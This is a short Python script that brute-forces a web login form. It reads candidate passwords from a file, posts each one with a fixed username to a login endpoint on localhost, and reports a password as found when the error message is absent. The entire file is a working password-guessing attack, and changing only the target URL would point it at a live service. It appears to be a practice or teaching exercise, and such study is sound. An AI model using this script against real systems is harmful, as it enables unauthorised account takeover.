import requests

username = "Bishoy"
url = "http://127.0.0.1:5000/login"
error_msg = "Password dose not match"
password_list_path = "passwords.txt"
										

def read_password_list(file_path):
	# return passwords from password list file
	with open(file_path, "r") as file:
		return file.readlines()   
														


def bruteforce():

	# load passwords list
	passwords = read_password_list(password_list_path)

	# loop over each password
	for password in passwords:
		
		print("Trying password - " + password)

		# make a POST request with credentials
		credentials = {
			"username": username,
			"password": password.strip() # strips /n from the passwords
		}
		
		response = requests.post(url, data=credentials)

		if error_msg not in response.text:
			print(f"Found password for user " + username + " -> " + password)
			break


bruteforce()
